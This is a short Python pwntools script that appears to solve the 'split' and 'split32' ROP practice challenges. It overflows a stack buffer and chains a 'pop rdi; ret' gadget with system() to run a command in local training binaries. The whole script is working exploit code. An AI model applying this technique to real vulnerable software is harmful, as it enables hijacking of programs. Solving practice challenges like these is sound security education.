from pwn import *

p = process('./split32')
p.read()

fill = b'A' * 0x2c
system_addr = b'\x57\x86\x04\x08'
arg_to_system = b'\x30\xa0\x04\x08'

p.writeline(fill + system_addr + arg_to_system)
p.read().decode()

''''
0x0000000000400883 : pop rdi ; ret
'''

p = process('./split')
p.read()
fill = b'A' * 0x28
set_rdi = struct.pack('Q', 0x0000000000400883)
system_addr = struct.pack('Q', 0x0000000000400810)
arg_to_system = struct.pack('Q', 0x0000000000601060)

p.writeline(fill + set_rdi + arg_to_system + system_addr)
print(p.read().decode())
p.close()
